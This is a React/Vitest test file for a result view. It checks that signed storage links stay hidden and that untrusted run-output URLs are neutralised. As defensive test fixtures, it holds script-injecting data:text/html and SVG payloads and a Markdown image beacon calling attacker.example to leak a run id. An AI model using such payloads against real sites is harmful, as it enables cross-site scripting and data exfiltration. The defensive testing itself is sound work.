import { describe, it, expect, vi, beforeEach } from "vitest";
import { render, screen, fireEvent, waitFor } from "@testing-library/react";
import { DOCUMENT_FORMATS, type RunField } from "@pipelex/mthds-form";
import { ResultEnv } from "./ResultEnv";
import { RunResult } from "./RunResult";
import { requireResultField } from "@/lib/resultField";
import { requireContract } from "@/lib/runInputs";
import { OUTPUT_FORM, PIPE_IO_CONTRACTS } from "@/test/fixtures/contracts/generate-image";
import * as textStats from "@/test/fixtures/contracts/text-stats";

const resolveShareUrl = vi.fn();
vi.mock("@/actions/shareUrl", () => ({
  resolveShareUrl: (uri: string) => resolveShareUrl(uri),
}));

const CONTRACT = requireContract(PIPE_IO_CONTRACTS, "generate_image", "generate_image");
const FIELD = requireResultField(OUTPUT_FORM, CONTRACT, "generate_image", "generate_image");

const STORAGE_URI = "pipelex-storage://org_1/runs/01J/outputs/illustration.png";
const SIGNED_URL = "https://bucket.s3.amazonaws.com/illustration.png?X-Amz-Signature=expiring";

// What the hosted runtime returns for a `native.Image`: the durable reference
// in `url`, and the store's signed link in `public_url`.
const IMAGE = { url: STORAGE_URI, public_url: SIGNED_URL, mime_type: "image/png" };

beforeEach(() => resolveShareUrl.mockReset());

describe("ResultEnv", () => {
  it("paints a stored image through the assets route rather than the signed link", () => {
    const { container } = render(
      <ResultEnv>
        <RunResult field={FIELD} value={IMAGE} name="generate_image" />
      </ResultEnv>,
    );

    // A rendered file is always an `<img>`; the kernel's icons are `<svg>`.
    const img = container.querySelector("img");
    expect(img).not.toBeNull();
    expect(img).toHaveAttribute("src", "/api/assets/org_1/runs/01J/outputs/illustration.png");
    // The signed link — the credential — is nowhere in the page.
    expect(container.innerHTML).not.toContain("X-Amz-Signature");
  });

  it("is what makes the difference: without it the kernel falls back to the signed link", () => {
    const { container } = render(<RunResult field={FIELD} value={IMAGE} name="generate_image" />);
    expect(container.querySelector("img")).toHaveAttribute("src", SIGNED_URL);
  });

  it("leaves a payload that carries no storage reference to the kernel's own reading", () => {
    const { container } = render(
      <ResultEnv>
        <RunResult
          field={FIELD}
          value={{ url: "https://cdn.example/picture.png" }}
          name="generate_image"
        />
      </ResultEnv>,
    );
    expect(container.querySelector("img")).toHaveAttribute(
      "src",
      "https://cdn.example/picture.png",
    );
  });

  it("hands the copy-URL control the storage reference to mint a share link from", async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.defineProperty(navigator, "clipboard", {
      value: { writeText },
      configurable: true,
    });
    resolveShareUrl.mockResolvedValueOnce("https://bucket.example/fresh?sig=1");

    render(
      <ResultEnv>
        <RunResult field={FIELD} value={IMAGE} name="generate_image" />
      </ResultEnv>,
    );

    fireEvent.click(screen.getByRole("button", { name: "Copy the URL" }));

    await waitFor(() =>
      expect(writeText).toHaveBeenCalledWith("https://bucket.example/fresh?sig=1"),
    );
    expect(resolveShareUrl).toHaveBeenCalledWith(STORAGE_URI);
  });
});

// A run's output is model-shaped data crossing a trust boundary, and the result
// view hands it to the kernel untouched: the kernel's `viewableUrl` gate is the
// only thing between a payload's file URLs and the elements the kernel renders.
// (An HTML result's markup is outside it: the kernel frames that markup under a
// content policy admitting `https:` images, and no case here can see inside the
// frame — see `docs/input-form.md`.) These cases pin the gate at
// the host's own composition — `<RunResult>` under `<ResultEnv>`, as the root
// layout mounts it — so a kernel release that loosens the gate, a resolver that
// launders a payload path, or a `proseImages="load"` added to the provider fails
// here. They assert on what a browser would be handed, never on kernel internals.
describe("ResultEnv — the URLs a run's payload can reach", () => {
  // No shipped method outputs a document, so the field is built by hand.
  const DOCUMENT_FIELD: RunField = {
    kind: "document",
    name: "output",
    required: true,
    formats: DOCUMENT_FORMATS,
  };
  const TEXT_CONTRACT = requireContract(textStats.PIPE_IO_CONTRACTS, "text_stats", "analyze_text");
  const TEXT_FIELD = requireResultField(
    textStats.OUTPUT_FORM,
    TEXT_CONTRACT,
    "text_stats",
    "analyze_text",
  );

  /** Every URL the page hands the browser to fetch, open or frame. */
  function sinkUrls(container: HTMLElement): string[] {
    return [...container.querySelectorAll("[src], [href]")].flatMap((el) =>
      ["src", "href"].flatMap((attr) => el.getAttribute(attr) ?? []),
    );
  }

  function renderResult(field: RunField, value: unknown) {
    return render(
      <ResultEnv>
        <RunResult field={field} value={value} name="output" />
      </ResultEnv>,
    );
  }

  it("offers a preview of a stored document, through the resolver's path", () => {
    // The positive control for the refusals below: a preview control exists,
    // and a refusal is its absence rather than a label that never rendered. It
    // is not clicked, because the frame would make happy-dom fetch its source.
    renderResult(DOCUMENT_FIELD, {
      url: "pipelex-storage://org_1/runs/01J/outputs/report.pdf",
      filename: "report.pdf",
      mime_type: "application/pdf",
    });
    expect(screen.getByRole("button", { name: "Preview" })).toBeInTheDocument();
  });

  it("hands a browser no data:text/html document, whatever its filename claims", () => {
    // A `data:` document gets an opaque origin, so it cannot reach this app's cookies or
    // DOM, but framed unsandboxed it would run its script and draw its own UI in the page.
    const { container } = renderResult(DOCUMENT_FIELD, {
      url: "data:text/html,<script>parent.document.title='owned'</script>",
      filename: "report.pdf",
      mime_type: "application/pdf",
    });

    expect(sinkUrls(container).filter((url) => url.startsWith("data:"))).toEqual([]);
    expect(screen.queryByRole("button", { name: "Preview" })).not.toBeInTheDocument();
    expect(container.querySelector("iframe")).toBeNull();
  });

  it("frames no data: document, even one of a type the gate admits", () => {
    // The gate admits a PDF `data:` URL, so this is the framing rule's own
    // refusal, which the `data:text/html` case above never reaches. The link
    // proves the gate let it through: were PDF dropped from the gate's list, this
    // case would fail here rather than pass without reaching the framing rule.
    const url = "data:application/pdf;base64,JVBERi0xLjQK";
    const { container } = renderResult(DOCUMENT_FIELD, {
      url,
      filename: "report.pdf",
      mime_type: "application/pdf",
    });

    expect(screen.getByRole("link", { name: "report.pdf" })).toHaveAttribute("href", url);
    expect(screen.queryByRole("button", { name: "Preview" })).not.toBeInTheDocument();
    expect(container.querySelector("iframe")).toBeNull();
  });

  it("paints no SVG data: image, which executes as a document", () => {
    const { container } = renderResult(FIELD, {
      url: "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>",
      mime_type: "image/svg+xml",
    });

    expect(container.querySelector("img")).toBeNull();
    expect(sinkUrls(container).filter((url) => url.startsWith("data:"))).toEqual([]);
  });

  it("renders a Markdown image in a text result as a link, never a fetch on paint", () => {
    const beacon = "https://attacker.example/collect?run=01J";
    const { container } = renderResult(TEXT_FIELD, {
      text: `Here is the chart you asked for: ![chart](${beacon})`,
    });

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByRole("link", { name: "chart" })).toHaveAttribute("href", beacon);
  });

  it("frames no same-origin path the payload names, only one the resolver produced", () => {
    // A path is this app's own origin; framed, an SVG served there is a document
    // with a DOM beside the page. The same file is previewable when the resolver
    // produced the path from a stored reference, and not when the payload wrote
    // the path itself — so provenance is the only thing that differs.
    const svg = { filename: "x.svg", mime_type: "image/svg+xml" };
    const stored = renderResult(DOCUMENT_FIELD, { ...svg, url: "pipelex-storage://org_1/x.svg" });
    expect(screen.getByRole("button", { name: "Preview" })).toBeInTheDocument();
    stored.unmount();

    const { container } = renderResult(DOCUMENT_FIELD, { ...svg, url: "/api/assets/org_1/x.svg" });
    expect(screen.queryByRole("button", { name: "Preview" })).not.toBeInTheDocument();
    expect(container.querySelector("iframe")).toBeNull();
  });
});
